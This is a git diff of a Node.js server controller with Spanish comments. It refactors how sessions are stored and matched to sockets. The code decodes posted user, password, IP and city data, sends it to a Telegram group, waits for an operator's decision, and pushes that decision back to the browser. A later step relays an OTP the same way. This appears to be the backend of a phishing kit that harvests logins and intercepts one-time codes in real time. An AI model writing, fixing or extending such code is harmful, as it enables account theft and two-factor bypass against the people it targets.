@@ -11,99 +11,83 @@ import { v4 as uuidv4 } from "uuid";
 
 let ioInstance;
 export const activeSessions = new Map(); // socketId → session
-export const decisionMap = new Map(); // decisionId → socketId
+export const decisionMap = new Map(); // socketId → session
 
 export const setSocketIO = (io) => {
   ioInstance = io;
 };
 
-
 export const initProcess = async (req, res) => {
-  const { data, socketId, isRetry = false } = req.body;
-  console.log("socketId: ",socketId);
-  console.log("isRetry: ",isRetry);
-  console.log("activeSessions: ", activeSessions);
-  console.log("decisionMap: ", decisionMap);
-  
-  
+  let { data, sessionId, socketId, isRetry = false } = req.body;
+
   try {
     const groupId = process.env.GROUP_1;
     const decrypted = JSON.parse(atob(data));
-    
-    // Si es reintento, elimina decisiones anteriores
-    if (isRetry && activeSessions.has(socketId)) {
-      const oldSession = activeSessions.get(socketId);
-      if (oldSession?.decisionId) {
-        removePending(oldSession.decisionId);
-      }
-    }
-
-    console.log("socketId: ",socketId);
-    console.log("isRetry: ",isRetry);
-    console.log("activeSessions: ", activeSessions);
-    console.log("decisionMap: ", decisionMap);
-  
 
     // Genera nueva sesión o reutiliza existente
-    let session = isRetry && activeSessions.get(socketId)
-      ? { 
-          ...activeSessions.get(socketId), 
-          decisionId: uuidv4(), // Nuevo UUID para decisiones
-          messageId: null,     // Reinicia messageId para evitar colisión
-          step: 1,             // Reinicia flujo en paso 1
-        }
+    let session = activeSessions.get(sessionId)
+      ? isRetry
+        ? {
+            ...activeSessions.get(sessionId),
+            ...decrypted, // Actualizar datos de usuario
+            socketId,
+            decisionId: uuidv4(),
+            messageId: null,
+            step: 1,
+          }
+        : {
+            ...activeSessions.get(sessionId),
+            socketId,
+            decisionId: uuidv4(),
+            messageId: null,
+            step: 1,
+          }
       : {
-          sessionId: uuidv4(),
+          sessionId,
           socketId,
-          user: decrypted.user,
-          pass: decrypted.pass,
-          ip: decrypted.ip,
-          city: decrypted.city,
-          decisionId: uuidv4(), // UUID único
+          decisionId: uuidv4(),
           messageId: null,
           step: 1,
+          ...decrypted,
         };
-
-    console.log("session: ",session);
     // Almacena nueva decisión
-    activeSessions.set(socketId, session);
-    decisionMap.set(session.decisionId, socketId); // UUID → socketId
-
-    console.log("activeSessions2: ",activeSessions);
-    console.log("decisionMap2: ",decisionMap);
+    activeSessions.set(sessionId, session);
+    decisionMap.set(session.decisionId, session.sessionId);
 
     // Envía mensaje a Telegram
     const messageText = buildMessageText(session);
     const { message_id } = await sendTelegramAlert({
+      sessionId: session.sessionId,
       groupId: process.env.GROUP_1,
       text: messageText,
-      decisionId: session.decisionId,
     });
 
     session.messageId = String(message_id);
-    activeSessions.set(socketId, session);
+    activeSessions.set(session.sessionId, session);
 
     // Espera decisión con el nuevo decisionId
     waitForDecision(session.decisionId, session.step)
       .then((decision) => {
-        const sockId = decisionMap.get(session.decisionId);
+        const sockId = session.socketId;
         if (sockId && ioInstance) {
-          ioInstance.to(sockId).emit('decision', decision);
+          ioInstance.to(sockId).emit("decision", decision);
+          decisionMap.delete(session.decisionId);
         }
-        decisionMap.delete(session.decisionId);
       })
       .catch((err) => {
-        console.error('Timeout:', err.message);
+        console.error("Timeout:", err.message);
+        activeSessions.delete(session.sessionId);
+        decisionMap.delete(session.decisionId);
       });
 
-    return res.status(200).json({ 
-      success: true, 
-      decisionId: session.decisionId, 
+    return res.status(200).json({
+      success: true,
       step: session.step,
-      messageId: session.messageId
+      sessionId: session.sessionId,
+      messageId: session.messageId,
     });
   } catch (error) {
-    console.error('Error en initProcess:', error);
+    console.error("Error en initProcess:", error);
     return res.status(500).json({ success: false, error: error.message });
   }
 };
@@ -207,7 +191,6 @@ export const updateMessageWithOtp = async (req, res) => {
 
     const newDecisionId = `${socketId}-otp-${Date.now()}`;
     session.decisionId = newDecisionId;
-    decisionMap.set(newDecisionId, socketId);
 
     await editTelegramMessage({
       chatId: session.chatId,
@@ -225,12 +208,11 @@ export const updateMessageWithOtp = async (req, res) => {
 
     waitForDecision(newDecisionId)
       .then((decision) => {
-        const sockId = decisionMap.get(newDecisionId);
+        const sockId = session.socketId;
         const sess = activeSessions.get(sockId);
         if (sess && ioInstance) {
           ioInstance.to(sockId).emit("final-decision", decision);
         }
-        decisionMap.delete(newDecisionId);
       })
       .catch((err) => {
         console.error("Timeout esperando decisión del OTP:", err.message);
